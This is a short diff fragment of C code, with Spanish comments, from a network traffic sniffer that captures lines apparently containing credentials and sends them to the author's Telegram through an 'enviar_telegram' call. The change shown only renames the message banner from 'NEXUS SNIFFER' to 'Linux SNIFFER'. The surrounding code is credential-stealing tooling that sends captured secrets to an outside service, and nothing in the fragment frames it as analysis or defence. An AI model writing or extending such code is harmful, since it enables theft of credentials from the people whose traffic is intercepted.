@@ -19,7 +19,7 @@ void analizar_trafico() {
 
             // 2. Enviar a tu Telegram
             char msg[1024];
-            sprintf(msg, "🔐 NEXUS SNIFFER: Posible credencial capturada: %s", linea);
+            sprintf(msg, "🔐 Linux SNIFFER: Posible credencial capturada: %s", linea);
             enviar_telegram(msg); // Usando la función que creamos antes
         }
     }
